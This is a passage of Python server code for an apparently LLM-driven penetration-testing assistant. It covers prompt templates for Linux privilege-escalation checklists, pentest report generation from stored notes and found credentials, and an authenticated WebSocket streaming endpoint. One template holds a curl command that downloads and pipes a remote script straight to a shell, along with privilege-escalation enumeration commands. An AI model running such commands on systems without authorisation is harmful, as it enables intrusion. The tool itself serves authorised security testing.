          "risk": "critical|high|medium|low"
        }}
      ]
    }}
  ],
  "automated_tools": [
    {{
      "name": "LinPEAS",
      "command": "curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh | sh",
      "notes": "Most comprehensive automated enum"
    }}
  ],
  "quick_wins": ["sudo -l", "cat /etc/crontab", "find / -writable -type f 2>/dev/null | grep -v proc"]
}}

Include all major categories: sudo, SUID, cron, PATH hijacking, capabilities, writable files, services, NFS, Docker, kernel exploits."""

    loop = asyncio.get_running_loop()
    try:
        raw = await loop.run_in_executor(_executor, lambda: _blocking_generate(prompt, max_tokens=6000))
        match = re.search(r'\{.*\}', raw, re.DOTALL)
        if match:
            result = json.loads(match.group())
        else:
            result = {"os": req.os_type, "categories": [{"name": "AI Output", "checks": [{"command": raw}]}]}
        return {"result": result}
    except Exception as e:
        return _err500(e)


# ── Report Generator ─────────────────────────────────────────────────────────

@app.post("/api/report/generate")
async def generate_report(req: ReportRequest):
    ctx = TargetContext(req.target)
    if not ctx.exists():
        raise HTTPException(status_code=404, detail="No data found for this target")

    notes   = ctx.list_notes()
    creds   = ctx.list_credentials()
    chain   = ctx.get_attack_chain()
    summary = ctx.context_summary()

    prompt = f"""Write a professional penetration test report in Markdown format.

Report Details:
- Title: {req.title}
- Target: {req.target}
- Date: {req.date}
- Author: {req.author or 'Security Researcher'}
- Overall Severity: {req.severity}

Target Summary:
{summary}

Notes collected:
{json.dumps(notes, indent=2) if notes else 'None recorded'}

Credentials found:
{json.dumps([{{k:v for k,v in c.items() if k != 'hash_val'}} for c in creds], indent=2) if creds else 'None found'}

Attack chain:
{json.dumps(chain, indent=2) if chain else 'Not recorded'}

{f'Executive Summary (from researcher): {req.summary}' if req.summary else ''}

Write a complete professional report with:
1. Executive Summary
2. Scope & Methodology
3. Findings (each with Risk, Description, Evidence, Remediation)
4. Attack Chain Summary
5. Credentials Obtained
6. Recommendations
7. Conclusion

Use Markdown formatting. Include CVSS ratings where possible."""

    loop = asyncio.get_running_loop()
    try:
        report = await loop.run_in_executor(
            _executor,
            lambda: _blocking_generate(prompt, max_tokens=8192)
        )
        return {"report": report, "target": req.target}
    except Exception as e:
        log.exception("Report generation failed for target=%s", req.target)
        raise HTTPException(status_code=500, detail="Report generation failed — check server logs")


# ── Plugins ──────────────────────────────────────────────────────────────────

@app.get("/api/plugins")
async def list_plugins():
    plugins_dir = Path(__file__).parent / "plugins"
    if not plugins_dir.exists():
        return {"plugins": []}
    plugins = []
    for p in plugins_dir.iterdir():
        if p.is_dir() and (p / "plugin.json").exists():
            try:
                meta = json.loads((p / "plugin.json").read_text())
                meta["id"] = p.name
                plugins.append(meta)
            except Exception:
                pass
    return {"plugins": plugins}


# ─── WebSocket — real-time streaming ────────────────────────────────────────

@app.websocket("/ws/stream")
async def websocket_stream(websocket: WebSocket, token: str = Query(default="")):
    ip = websocket.client.host if websocket.client else "unknown"

    # Rate-limit WS handshakes
    if not ws_allowed(ip):
        await websocket.close(code=1008, reason="Too many connections")
        return

    # Auth check
    if not verify_token(token):
        await websocket.close(code=1008, reason="Unauthorized")
        return

    await websocket.accept()
    await websocket.send_json({"type": "connected"})

    try:
        while True:
            raw = await websocket.receive_text()
            try:
                data = json.loads(raw)
            except json.JSONDecodeError:
                await websocket.send_json({"error": "Invalid JSON"})
                continue

            if data.get("type") == "ping":
                await websocket.send_json({"type": "pong"})
                continue

            mode   = data.get("mode", "analyse")
            prompt = data.get("prompt", "")

            if not prompt.strip():
                await websocket.send_json({"error": "Empty prompt"})
                continue
            if len(prompt) > 32_000:
                await websocket.send_json({"error": "Prompt too long (max 32 000 chars)"})
                continue

            try:
                if mode == "analyse":
                    gen = router.stream_analyse(prompt, system=SystemPrompts.REASONING)
                elif mode == "code":
                    gen = router.stream_code(prompt, system=SystemPrompts.CODING)
                elif mode == "free":
                    model       = data.get("model", router.cfg.reasoning_model)
                    system_msg  = data.get("system", None)
                    temperature = float(data.get("temperature", 0.8))
                    gen = client.generate_stream(
                        model       = model,
                        prompt      = prompt,
                        system      = system_msg,
                        temperature = temperature,
                        max_tokens  = 8192,
                    )
                else:
                    await websocket.send_json({"error": f"Unknown mode: {mode}"})
                    continue

                await stream_tokens_to_ws(websocket, gen)

            except OllamaError as e:
                await websocket.send_json({"error": str(e), "done": True})

    except WebSocketDisconnect:
        pass
    except Exception:
        log.exception("WebSocket handler unexpected error (client=%s)", ip)


# ─── Static files ─────────────────────────────────────────────────────────────

_HERE = Path(__file__).parent
_WEB  = _HERE / "web_ui"

# No-cache headers for files that change during development.
# Browsers will re-validate on every page load instead of serving stale copies.
_NO_CACHE_FILES = {"app.js", "index.html"}
_NO_CACHE_HEADERS = {
    "Cache-Control": "no-cache, no-store, must-revalidate",
    "Pragma":        "no-cache",
    "Expires":       "0",
}

@app.get("/")
async def index():
    return FileResponse(_WEB / "index.html", headers=_NO_CACHE_HEADERS)

@app.get("/static/app.js")
async def serve_app_js():
    """Serve app.js with no-cache headers so browser always picks up changes."""
    return FileResponse(_WEB / "app.js", headers=_NO_CACHE_HEADERS, media_type="application/javascript")

@app.get("/static/manifest.json")
async def serve_manifest():
    """PWA manifest — no-cache so icon/name changes propagate immediately."""
    return FileResponse(
        _WEB / "manifest.json",
        headers=_NO_CACHE_HEADERS,
        media_type="application/manifest+json",
    )

@app.get("/static/sw.js")
async def serve_sw():
    """Service worker must be served from a stable URL at the app scope."""
    return FileResponse(
        _WEB / "sw.js",
        headers={
            "Content-Type": "application/javascript",
            "Service-Worker-Allowed": "/",
            # SW itself should revalidate so updates propagate within 24 h
            "Cache-Control": "no-cache, no-store, must-revalidate",
        },
    )

if _WEB.exists():
    app.mount("/static", StaticFiles(directory=str(_WEB)), name="static")


# ─── Entry point ─────────────────────────────────────────────────────────────

if __name__ == "__main__":
    import uvicorn

    _HERE_WS = Path(__file__).parent
    _CERT    = _HERE_WS / "certs" / "server.crt"
    _KEY     = _HERE_WS / "certs" / "server.key"
    _TLS     = _CERT.exists() and _KEY.exists()
    _PORT    = int(os.environ.get("PORT", "8443" if _TLS else "8000"))
    _SCHEME  = "https" if _TLS else "http"

    log.info("Vulntrix v3.0 starting — %s://localhost:%d", _SCHEME, _PORT)
    if _TLS:
        log.info("TLS enabled using %s", _CERT)
    if auth.AUTH_ENABLED:
        log.info("Auth ENABLED — session TTL %d h", auth.SESSION_TTL // 3600)

    uvicorn.run(
        app,
        host        = "127.0.0.1",      # localhost only — no LAN exposure
        port        = _PORT,
        log_level   = "warning",
        ssl_keyfile  = str(_KEY)  if _TLS else None,
        ssl_certfile = str(_CERT) if _TLS else None,
    )
